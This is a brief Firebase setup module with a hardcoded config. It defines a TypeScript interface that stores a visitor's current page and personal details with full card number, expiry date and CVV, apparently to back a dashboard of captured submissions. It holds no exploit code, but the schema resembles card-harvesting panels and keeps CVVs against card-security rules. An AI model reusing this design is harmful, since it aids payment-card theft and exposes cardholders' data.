import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
 apiKey: "AIzaSyBAJ2MmZgFP8nJCqRelKAXxguMBnlAz_y8",
  authDomain: "fvsdv-88329.firebaseapp.com",
  projectId: "fvsdv-88329",
  storageBucket: "fvsdv-88329.firebasestorage.app",
  messagingSenderId: "674597762562",
  appId: "1:674597762562:web:2b7d0e28250772e228991b",
  measurementId: "G-85LCNJ4PJR"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}





